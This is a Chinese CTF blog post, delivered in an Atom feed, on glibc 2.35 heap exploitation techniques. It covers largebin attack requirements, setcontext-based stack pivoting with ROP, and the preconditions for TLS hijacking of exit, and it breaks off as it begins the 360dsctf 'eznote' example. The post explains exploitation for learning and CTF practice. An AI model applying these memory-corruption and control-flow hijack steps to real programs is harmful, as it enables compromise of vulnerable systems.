<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>我他喵的 • Posts by &#34;pwn&#34; tag</title>
    <link href="http://example.com" />
    <updated>2022-08-01T08:24:13.000Z</updated>
    <category term="writeup" />
    <category term="learning" />
    <category term="pwn" />
    <category term="Hello World" />
    <category term="Learning" />
    <category term="二进制学习" />
    <category term="逆向" />
    <category term="reverse" />
    <entry>
        <id>http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</id>
        <title>glibc-2.35一些手法</title>
        <link rel="alternate" href="http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/"/>
        <content type="html">&lt;h1 id=&#34;glibc-235-ubuntu3-下的利用手法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glibc-235-ubuntu3-下的利用手法&#34;&gt;#&lt;/a&gt; glibc 2.35 ubuntu3 下的利用手法。&lt;/h1&gt;
&lt;p&gt;原本我们以为 2.35 的时代不会来的这么快，但是最近 DS360ctf，以及强网杯几道题目的出现让 glibc 的 pwn 生存条件急剧下降。&lt;/p&gt;
&lt;p&gt;首先我们谈谈为什么很多师傅都人为 2.35 的堆 pwn 是一个寒冬：&lt;/p&gt;
&lt;h2 id=&#34;现状&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#现状&#34;&gt;#&lt;/a&gt; 现状：&lt;/h2&gt;
&lt;p&gt;之所以这样讲，一部分原因在于由于高版本的 glibc 的安全特性，封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。但是这并不是让题目更难，觉得反而是解题出现严重的两级分化，一部分师傅研究过几个手法，几乎就可以做到一口气解决，因为利用的手法比较单一，就那么几种，即便是先提出的手法，其实原理也是大同小异。而对于不了解的师傅，就会陷入深渊，没有后门，或者自己习惯的后门都被堵上了，怎么走。&lt;/p&gt;
&lt;p&gt;我们发现，其实大部分的情况都都是因为 hook 被禁止。而最近出现的手法，就要求我们要继续挖掘 io 的利用链。&lt;/p&gt;
&lt;p&gt;所以这次我就要花费一些时间整理一部分。主要还是基于目前出现的一些题目的复现。&lt;/p&gt;
&lt;p&gt;** 在 35 时代，我们必须学会 largebinattack&lt;/p&gt;
&lt;p&gt;目前计划着是有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;house of apple 1&lt;/li&gt;
&lt;li&gt;house of apple 2&lt;/li&gt;
&lt;li&gt;house of apple 3&lt;/li&gt;
&lt;li&gt;house of cat&lt;/li&gt;
&lt;li&gt;house of emma&lt;/li&gt;
&lt;li&gt;house of banana&lt;/li&gt;
&lt;li&gt;tls 劫持&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;一些小总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些小总结&#34;&gt;#&lt;/a&gt; 一些小总结：&lt;/h2&gt;
&lt;p&gt;目前遇到的 2.35 的题目都是基于同一个版本&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@dreamcat-virtual-machine:~/Desktop/360dsctf/eznote$ strings libc.so.6 |grep ubuntu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https://bugs.launchpad.net/ubuntu/+&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;largebinattack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#largebinattack&#34;&gt;#&lt;/a&gt; largebinattack&lt;/h2&gt;
&lt;p&gt;关键代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             victim_index = largebin_index (size);                               &lt;span class=&#34;comment&#34;&gt;//largebins&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bck = bin_at (av, victim_index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;/* maintain large bins in sorted order */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fwd != bck)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;comment&#34;&gt;/* Or with inuse bit to speed comparisons */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 size |= PREV_INUSE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;comment&#34;&gt;/* if smaller than smallest, bypass loop below */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 assert (chunk_main_arena (bck-&amp;gt;bk));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &amp;lt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (bck-&amp;gt;bk))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     fwd = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     bck = bck-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     victim-&amp;gt;fd_nextsize = fwd-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     victim-&amp;gt;bk_nextsize = fwd-&amp;gt;fd-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     fwd-&amp;gt;fd-&amp;gt;bk_nextsize = victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     assert (chunk_main_arena (fwd));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) size &amp;lt; chunksize_nomask (fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         fwd = fwd-&amp;gt;fd_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  assert (chunk_main_arena (fwd));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  == (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &lt;span class=&#34;comment&#34;&gt;/* Always insert in the second position.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       fwd = fwd-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         victim-&amp;gt;fd_nextsize = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         victim-&amp;gt;bk_nextsize = fwd-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (fwd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize != fwd))                        &lt;span class=&#34;comment&#34;&gt;//相比于2.29新增加的判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                           malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): largebin double linked list corrupted (nextsize)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         fwd-&amp;gt;bk_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     bck = fwd-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bck-&amp;gt;fd != fwd)                               &lt;span class=&#34;comment&#34;&gt;////相比于2.29新增加的判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): largebin double linked list corrupted (bk)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               victim-&amp;gt;fd_nextsize = victim-&amp;gt;bk_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;相比于 2.29，新增加了两个检查。因为这些检查的原因，我们只有插入小 size 额可以实现 attack,&lt;/p&gt;
&lt;h3 id=&#34;要求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#要求&#34;&gt;#&lt;/a&gt; 要求&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;对应的 bin 中只有一个 free_chunk,（此时 fd_nextsize,bk_nextsize 都指向自己）&lt;/li&gt;
&lt;li&gt;修改 free_chunk 的 bk_nextsize 为目标地址减去 0x20.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;setcontext&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#setcontext&#34;&gt;#&lt;/a&gt; setcontext&lt;/h2&gt;
&lt;p&gt;在新的版本中，setcontext 不再是直接使用 rdi，而是使用 rdx 进行参数的一些设置。所以需要一些手段在 setcontext 之前，能够设置 rdx 为可控制的堆空间。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea6d &amp;lt;setcontext+61&amp;gt;     mov    rsp, qword ptr [rdx + 0xa0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;► 0x7f2c07abea74 &amp;lt;setcontext+68&amp;gt;     mov    rbx, qword ptr [rdx + 0x80]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea7b &amp;lt;setcontext+75&amp;gt;     mov    rbp, qword ptr [rdx + 0x78]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea7f &amp;lt;setcontext+79&amp;gt;     mov    r12, qword ptr [rdx + 0x48]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea83 &amp;lt;setcontext+83&amp;gt;     mov    r13, qword ptr [rdx + 0x50]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea87 &amp;lt;setcontext+87&amp;gt;     mov    r14, qword ptr [rdx + 0x58]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea8b &amp;lt;setcontext+91&amp;gt;     mov    r15, qword ptr [rdx + 0x60]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea8f &amp;lt;setcontext+95&amp;gt;     test   dword ptr fs:[0x48], 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea9b &amp;lt;setcontext+107&amp;gt;    je     setcontext+294                &amp;lt;setcontext+294&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb56 &amp;lt;setcontext+294&amp;gt;    mov    rcx, qword ptr [rdx + 0xa8]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb5d &amp;lt;setcontext+301&amp;gt;    push   rcx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb5e &amp;lt;setcontext+302&amp;gt;	mov    rsi,QWORD PTR [rdx+0x70]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb62 &amp;lt;setcontext+306&amp;gt;:	mov    rdi,QWORD PTR [rdx+0x68]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb66 &amp;lt;setcontext+310&amp;gt;:	mov    rcx,QWORD PTR [rdx+0x98]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb6d &amp;lt;setcontext+317&amp;gt;:	mov    r8,QWORD PTR [rdx+0x28]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb71 &amp;lt;setcontext+321&amp;gt;:	mov    r9,QWORD PTR [rdx+0x30]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb75 &amp;lt;setcontext+325&amp;gt;:	mov    rdx,QWORD PTR [rdx+0x88]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb7c &amp;lt;setcontext+332&amp;gt;:	xor    eax,eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb7e &amp;lt;setcontext+334&amp;gt;:	ret &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rdx 我们提前布置为我们可以控制的堆上，保证 rbp 大于、等于 rsp。除了 rcx，其他寄存器直接设置为 0，这里单独提出来 rcx，是因为 setcontext 最后 ret 的时候相当于，mov rip,[rsp]。加一个 ret 后，就可以劫持程序栈 rip.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; RBP  &lt;span class=&#34;number&#34;&gt;0x563dfde0ada0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f3391d8b3e5&lt;/span&gt; (iconv+&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;) ◂— pop    rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSP  &lt;span class=&#34;number&#34;&gt;0x563dfde0ad98&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f3391db4b52&lt;/span&gt; (setcontext+&lt;span class=&#34;number&#34;&gt;290&lt;/span&gt;) ◂— ret    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RIP  &lt;span class=&#34;number&#34;&gt;0x7f3391db4b7e&lt;/span&gt; (setcontext+&lt;span class=&#34;number&#34;&gt;334&lt;/span&gt;) ◂— ret    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ DISASM ]───────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b66&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;310&lt;/span&gt;&amp;gt;    mov    rcx, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b6d&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;317&lt;/span&gt;&amp;gt;    mov    r8, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b71&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;321&lt;/span&gt;&amp;gt;    mov    r9, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b75&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;325&lt;/span&gt;&amp;gt;    mov    rdx, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b7c&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;332&lt;/span&gt;&amp;gt;    xor    eax, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7f3391db4b7e&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;334&lt;/span&gt;&amp;gt;    ret &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们的 rbp 设置为 rop 的开始而不是在下一条。但是我还没有搞清楚是否可以用 leave;ret; 浅尝了一下，不可以&lt;/p&gt;
&lt;h2 id=&#34;tls劫持exit执行流&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tls劫持exit执行流&#34;&gt;#&lt;/a&gt; tls 劫持 exit 执行流&lt;/h2&gt;
&lt;h3 id=&#34;前提条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前提条件&#34;&gt;#&lt;/a&gt; 前提条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;任意地址写一个堆地址，&lt;/li&gt;
&lt;li&gt;泄露出 heap 地址，libc 地址&lt;/li&gt;
&lt;li&gt;我们可以改写一个 chunk 的头部信息，prev_size,size。&lt;/li&gt;
&lt;li&gt;程序可以执行 exit（这里我们仅仅测试了 main 函数直接 retutrn, 显式调用 exit 应该也可以，或者报错）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;这里我们以360dsctf的eznote为例题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这里我们以360dsctf的eznote为例题&#34;&gt;#&lt;/a&gt; 这里我们以 360dsctf 的 eznote 为例题，&lt;/h3&gt;
&lt;p&gt;程序实现了基本的增删改查，程序初始化的时候，申请了一个 chunk 用作一个指针数组，用于储存我们申请的 note.&lt;/p&gt;
